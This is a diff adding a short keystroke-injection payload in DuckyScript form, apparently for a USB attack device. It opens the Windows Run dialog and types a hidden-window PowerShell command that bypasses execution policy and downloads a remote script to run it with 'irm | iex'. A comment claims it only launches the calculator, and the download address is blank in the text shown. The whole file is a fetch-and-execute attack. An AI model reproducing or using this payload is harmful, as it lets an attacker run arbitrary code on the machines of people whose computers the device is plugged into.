@@ -1,0 +1,5 @@
+GUI r
+DEFAULT_DELAY 300
+REM starts calc process using calculator.ps1
+STRING powershell -NoP -Ep Bypass -W H -C irm  | iex
+ENTER
